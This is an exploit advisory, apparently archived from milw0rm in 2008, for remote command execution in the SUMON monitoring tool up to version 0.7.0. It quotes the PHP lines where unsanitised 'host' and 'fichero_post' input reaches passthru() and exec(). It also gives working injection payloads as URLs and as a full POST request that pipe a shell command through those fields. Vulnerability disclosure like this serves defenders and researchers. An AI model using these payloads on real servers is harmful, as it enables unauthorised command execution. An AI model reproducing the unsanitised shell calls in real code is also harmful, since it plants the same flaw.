<html><head><title>SUMON <= 0.7.0 (chg.php host) Command Execution Vulnerability</title></head><pre>
  :::::::-.   ...    ::::::.    :::.
   ;;,   `';, ;;     ;;;`;;;;,  `;;;
   `[[     [[[['     [[[  [[[[[. '[[
    $$,    $$$$      $$$  $$$ &quot;Y$c$$
    888_,o8P'88    .d888  888    Y88
    MMMMP&quot;`   &quot;YmmMMMM&quot;&quot;  MMM     YM

   [ Discovered by dun \ dun[at]strcpy.pl ]

 ################################################################
 #  [ sumon &lt;= 0.7.0 ]  Remote Command Execution Vulnerability  #
 ################################################################
 #
 # Script: Simple Unix MONitor (sumon)
 #
 # Script Site: http://sumon.sourceforge.net/
 # Download: http://sourceforge.net/projects/sumon
 #
 # Vuln: http://site.com/sumon-0.7.0/chg.php?host=|id&gt;/tmp/dupa;
 #     
 # Bug: ./sumon-0.7.0/server/www/chg.php (lines: 32-25, 99)
 #
 # ...
 #       if (array_key_exists(&quot;host&quot;,$_GET))
 #       {
 #          $host         =  $_GET[&quot;host&quot;];
 #       }
 # ...
 #       passthru(&quot;${bindir}/chmgmtinfobuilder.pl --html --chgonly --node=$host --days=$days&quot;);
 # ...     
 #
 # Vuln: http://site.com/sumon-0.7.0/stats.php?host=|id&gt;/tmp/dupa;
 #     
 # Bug: ./sumon-0.7.0/server/www/stats.php (lines: 23-25, 294)
 #
 # ...
 #        if (array_key_exists(&quot;host&quot;,$_GET))
 #        {
 #      $host         =  $_GET[&quot;host&quot;];
 # ...     
 #         exec (&quot;$graphstats -h $host -l $graphic -g GRAPH:&quot;.$time.&quot;:&quot;.$timefactor.&quot; &quot;.$timestampstring.&quot; &quot;.$endstring.&quot; &gt; /dev/null 2&gt;&amp;1&quot;);
 # ...     
 #
 # Vuln: http://site.com/sumon-0.7.0/showfile.php  
 #       http://site.com/sumon-0.7.0/difffile.php
 #
 #     POST /sumon-0.7.0/showfile.php  HTTP/1.1
 #    
 #    Host: site.com
 #    User-Agent: Mozilla/5.0
 #    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 #    Accept-Language: pl,en-us;q=0.7,en;q=0.3
 #    Accept-Encoding: gzip,deflate
 #    Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7
 #    Keep-Alive: 300
 #    Connection: keep-alive
 #    Content-Type: application/x-www-form-urlencoded
 #    Content-Length: 27
 #    
 #    fichero_post=|id&gt;/tmp/dupa;
 #
 # Bug: ./sumon-0.7.0/server/www/showfile.php (lines: 36)
 #      ./sumon-0.7.0/server/www/difffile.php (lines: 36)
 # ...
 #           passthru(&quot;${bindir}/showfile.pl ${datadir}/$_POST[fichero_post]&quot;);
 # ...     
 #
 #
 ###############################################
 # Greetz: D3m0n_DE * str0ke * and otherz..
 ###############################################

 [ dun / 2008 ]

*******************************************************************************************

# milw0rm.com [2008-12-12]</pre></html>